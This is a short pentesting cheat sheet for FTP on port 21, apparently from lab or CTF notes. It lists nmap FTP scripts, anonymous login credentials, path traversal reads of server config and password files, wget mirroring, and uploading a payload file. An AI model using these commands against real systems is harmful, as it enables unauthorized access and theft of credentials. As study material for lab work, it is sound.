# (21) FTP

<details>

<summary>Nmap</summary>

<pre><code><strong>nmap --script ftp-* -p 21 10.11.67.208
</strong></code></pre>

</details>

<details>

<summary>Read Files on FTP</summary>

```bash
get <filename> -
```

### Path Traversal on vuln FTP Server

```bash
get ../../../xampp/apache/conf/httpd.conf -
```

```bash
get ../../../xampp/password -
```

</details>

<details>

<summary>Anonymous Login</summary>

_anonymous : anonymous_\
&#xNAN;_&#x61;nonymous :_\
&#xNAN;_&#x66;tp : ftp_

</details>

<details>

<summary>Download files using Wget</summary>

### Download selected directories

Eg: `program files (x86)/PRTG Network Monitor`

```bash
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.152/"program files (x86)/PRTG Network Monitor"
```

### Download all files

```bash
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
```

* If above command doesn't work --> try with no `--no-passive`

</details>

<details>

<summary>Uploading a binary file</summary>

```
ftp 192.168.138.53
```

```
pass
```

```
binary
```

```
put payload.bat
```

</details>
